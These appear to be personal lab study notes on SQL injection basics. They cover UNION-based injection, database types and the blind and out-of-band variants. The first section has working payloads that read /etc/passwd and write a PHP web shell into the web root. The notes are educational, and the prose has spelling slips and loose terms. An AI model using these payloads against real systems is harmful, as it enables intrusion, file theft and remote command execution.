# Sql Injection fundamentals
#HTB #SQLi #database #webapplication 

SQL injection is very similar in nature to HTML injection and XXS where user input have not been properly validated before sent to the backend. This vulnability allow a hacker to make unintented query to the database and get a response or information they were not suppose to have access too. This is often see when escape character are use such as *\"* or *\' *. Once the hacker have the ability to execute query on the server function such as union and stacked allowed a hacker to execute both the indented command but also a new query. 

This is a focus on in-band SQLi. 
Before starting to do SQLi you need to validate that the web application is vulnerable. This is done by testing the input field with different type of inputs. 
Once a input field have been identified as vulnerable to injection, to add additional information from the input field union is used to add query to the all ready existing one.
````sql
cn' UNION select 1,user(),3,4-- -
````

This command input cn and escape with ', it will then create a new select using union where the output is the user context the web application is running in. 

This also give us the possibility to read files from the system using *LOAD_FILE*
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

If we are lucky enough and the user have high enough priv we can also write to files.  
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
First we test if the user have enough priv if it does we can write to files and there by create a shell on the webserver. 
```sql
cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

## Database 
[[Database]] is way of storing information which can easily to query up again, made backup of, security controls. etc. There exists two type of database relative and non-relative databases. 
Relative database stores information in tables and row which can easily to query by using [[SQL]] to retrieve the information. 
Non-Relative database uses JSON instead for storage the information where there is a key pair value to every insert. Which have to be used to retrieve the information. 

## Type of SQLi
When it comes to [[SQL injection]] there exists two type in-band, Blind and Out-of-band. 
in-band SQLi is when the web application return the sql output directly to the front-end. 
In-band have two sup-types union based is when the return the output to us and Error based is when the output is returned in form of error messages. 

Blind injection is when the SQL output does not get return to us and we have to make assumption about the data. here we have two options boolean which return true if the statement is correct and false is it not, and time-based where we use the sleep function if the statement is correct. 

And finally we have out-of-band when we direct the output to a remote location such as DNS records. 




## Cheet sheet
[[cheatsheet-33]]
[PayloadsAllthingsSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#using-tor-with-sqlmap)